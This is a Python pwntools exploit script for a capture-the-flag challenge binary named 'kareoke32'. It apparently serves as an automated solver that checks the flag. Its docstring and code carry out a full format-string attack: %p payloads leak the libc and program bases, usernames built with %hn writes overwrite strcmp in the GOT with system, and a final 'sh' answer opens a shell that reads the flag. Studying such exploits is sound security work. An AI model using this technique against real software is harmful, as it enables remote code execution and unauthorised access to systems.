#!/usr/bin/env python3
from pwn import *
import time
LOCAL = False

def writeup():
	'''
	The program has a format string vulnerablility when printing the winner of each round.
	We can leak the base of libc and watevr else we need with the original players.
	After that we add 2 players for the sole purpose to replace strcmp@got with system.

	Libc version: i386-2.27

	1. Leak libc base
	2. Leak program base
	3. replace strcmp with system
	4. play a game and then answare "sh" to the Yes/No question
		-> get shell


	1 & 2:
		since there is a call to libc functions after the fromat string we can use that to leak libc
		dynamic analysis shows that %22$p leaks that address.
		there is also a address pointing inside the first segment at %22$p. we can use this to calculate the
		base offset of the program.
	3:
		*create 2 users,
		[strcmp_address + 2][%[system_addr[0]-4]x][%19$hn],
		[strcmp_address][%[system_addr[0]-4]x][%19$hn]
		*make both win one round
	4: get shell
	'''

intb = lambda a: int(str(a)[2:-1].replace("\\n", "").replace("\n", ""), 16)

def play_game(r, index_to_win, players):
	r.sendline("1") #play a game
	r.sendline(str(players))
	for i in range(players):
		if i != index_to_win:
			r.sendline("150") #bet 150
		else:
			r.sendline("99") #bet 99 to guarantee win
	r.recvuntil("And the winner is *drumroll*: ")
	time.sleep(0.1)
	try:
		result = str(r.recvline()).replace("\n", "")
	except:
		result = str(r.recvline()).replace("\n", "")
	return result

def leak_exit_shell(r):
	r.sendline("2") #two players are needed to begin with
	r.sendline("%22$p") #format string to leak libc
	r.sendline("%31$p") #format string to leak program base
	LIBC_BASE = hex(intb(play_game(r, 0, 1)) - 205685) #leak libc
	PROG_BASE = hex(intb(play_game(r, 1, 2)) - 2808) #leak program base
	print("libc base: " + str(LIBC_BASE))
	print("program base: " + str(PROG_BASE))
	EXIT_GOT = int(PROG_BASE, 16) + 0x254c
	SHELL = int(LIBC_BASE, 16) + 250368
	return EXIT_GOT, SHELL

def replace_strcmp_shell(r, strcmp, shell):
	system = str(hex(shell))[2:]
	system = [int(system[i:i+4], 16) for i in range(0, len(system), 4)]
	print("system: ", system[0], system[1])
	print("strcmp: " + str(p32(strcmp))[2:-1])
	r.sendline("3")
	username = str(p32(strcmp+2))[2:-1] + "%" + str(system[0]-4) + "x" + "%19$hn" #create user 1
	r.sendline(username)
	play_game(r, 2, 3)
	print(username)
	r.sendline("3")
	username = str(p32(strcmp))[2:-1] + "%" + str(system[1]-4) + "x" + "%19$hn" #create user 2
	r.sendline(username)
	print(username)
	play_game(r, 3, 4)
	print("done") #we have now replaced strcmp with system
	r.recv()

def get_shell(r):
	global LOCAL
	r.sendline("5") #exit game
	r.sendline("sh") #answare sh to Y/N
	if LOCAL:
		r.sendline("cat $PWD/container/flag.txt")
	else:
		r.sendline("ls")
		r.interactive()
		r.sendline("cat /home/ctf/flag.txt")
	time.sleep(2)
	msg = r.recv()
	print(msg)
	return msg

def solve(r):
	EXIT_GOT, SHELL = leak_exit_shell(r)
	print("Exit: " + str(hex(EXIT_GOT)))
	print("Shell:" + str(hex(SHELL)))
	replace_strcmp_shell(r, EXIT_GOT, SHELL)
	return get_shell(r)

def main(LOCAL):
	exit_code = 1
	flag = input("flag: ").replace("\n", "")
	ip, port = input("service: ").split(":")
	if LOCAL:
		context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
		r = gdb.debug("./kareoke32", '''
		file kareoke32
		continue
		''')
		print(solve(r))
	else:
		for i in range(100):
			try:
				r = remote(str(ip), int(port))
				ret = solve(r)
				print(ret)
				if str(flag) in str(ret):
					print("Correct")
					exit_code = 0
					break
			except:
				pass
		exit(exit_code)
main(LOCAL)
